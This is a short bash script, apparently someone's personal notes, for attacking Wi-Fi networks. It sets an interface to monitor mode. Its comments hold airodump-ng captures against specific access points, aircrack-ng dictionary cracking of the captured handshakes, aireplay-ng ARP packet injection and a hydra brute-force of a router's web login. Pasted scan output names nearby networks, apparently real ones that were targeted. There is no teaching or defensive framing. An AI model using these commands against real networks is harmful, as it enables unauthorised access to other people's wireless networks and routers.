#!/bin/bash

WLAN=wlan0mon
echo "start airemon..."
# airmon-ng start $WLAN 

ifconfig $WLAN down 
iwconfig $WLAN mode monitor 
ifconfig $WLAN up 
iwconfig $WLAN

echo "start airodump-ng..."
# airodump-ng $WLAN
# airodump-ng -w win10-360 -c 6 --bssid 8C:A9:82:47:87:9B $WLAN --ignore-negative-one
# aircrack-ng -w password.txt --bssid 8C:A9:82:47:87:9B win10-msh-01.cap
# 5C:63:BF:4D:E0:DA  -61       33        6    0   4  54e. WPA2 CCMP   PSK  TP-LINK_B1-106-Left 
# D8:15:0D:30:1D:1C  -48        8       21    5  11  54e. WPA2 CCMP   PSK  B1-302 

# aircrack-ng -w pass-dict/8-bits.lst win10-360-01.cap 
# BSSID              STATION            PWR   Rate    Lost    Frames  Probe    
# D8:15:0D:30:1D:1C  00:36:76:10:98:9D   -1    2e- 0      0      990 
# aireplay-ng -3 -b D8:15:0D:30:1D:1C -h 38:59:F9:DF:2B:1F wlan0mon //arprequest injection
# hydra -l admin -P pass-dict/8bits.lst -f -V -e nsr -t 1 192.168.1.1 http-get /
